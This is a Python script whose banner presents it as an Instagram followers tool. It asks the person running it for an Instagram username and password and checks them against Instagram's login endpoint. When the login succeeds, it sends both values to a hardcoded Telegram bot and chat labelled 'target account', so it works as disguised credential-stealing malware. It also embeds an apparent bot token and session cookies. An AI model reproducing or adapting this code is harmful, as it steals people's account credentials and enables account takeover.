import requests

id = ('1736589320')

#by mohammed ali

print('''\033[2;36m _                                                 ___      _ _                        

(_)           _                                   / __)    | | |

 _ ____   ___| |_  ____  ____  ____ ____ ____    | |__ ___ | | | ___  _ _ _  ____  ____ ___

| |  _ \ /___|  _)/ _  |/ _  |/ ___/ _  |    \   |  __/ _ \| | |/ _ \| | | |/ _  )/ ___/___)

| | | | |___ | |_( ( | ( ( | | |  ( ( | | | | |  | | | |_| | | | |_| | | | ( (/ /| |  |___ |

|_|_| |_(___/ \___\_||_|\_|| |_|   \_||_|_|_|_|  |_|  \___/|_|_|\___/ \____|\____|_|  (___/

                       (_____|                                                              ''')

token = ('5410125510:AAGHcBbzPu8qduiW-EV8y_cUnveGsccek-Y')

acc = input("[=] username : ")

pac = input('[=] password : ')

url_l = 'https://www.instagram.com/accounts/login/ajax/'

h = {'accept': '*/*',

         'accept-encoding': 'gzip, deflate, br',

         'accept-language': 'ar,en-US;q=0.9,en;q=0.8',

         'content-length': '326',

         'content-type': 'application/x-www-form-urlencoded',

         'cookie': 'mid=YVvhbgALAAGEYIx5zhMwH4bDBV45; ig_did=648907BC-0061-4C67-AFF5-C72FAA705508; ig_nrcb=1; rur="LDC\05451296553316\0541675250058:01f73352f31122060f419a1c03ef57b01f1db6d027546e0dce91569f7ba529abb34ba7de"; csrftoken=nM9X5ZO6mQsQ2mbsnSVMu2fy8wd5woQe',

         'origin': 'https://www.instagram.com',

         'referer': 'https://www.instagram.com/',

         'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',

         'x-asbd-id': '198387',

         'x-csrftoken': 'nM9X5ZO6mQsQ2mbsnSVMu2fy8wd5woQe',

         'x-ig-app-id': '936619743392459',

         'x-ig-www-claim': 'hmac.AR3VqP_m-krwiZnt3-dga6AdX4Ci5cwQwDhvGD_6DT0IRX8c',

         'x-instagram-ajax': 'ee0117db2fab',

         'x-requested-with': 'XMLHttpRequest'}

d = {'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1643714074:' + (pac), 'username': acc, 'queryParams': '{}',

         'optIntoOneTap': 'false', 'stopDeletionNonce': '', 'trustedDeviceRecords': '{}', }

r = requests.post(url_l,headers=h,data=d)

#my website : https://alhelfi.softr.app

if '"authenticated":true' in r.text:

    telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target account\npassword : {pac}\nusername : {acc}')

    req = requests.post(telegram_sand)

else:

    print('''error login''')
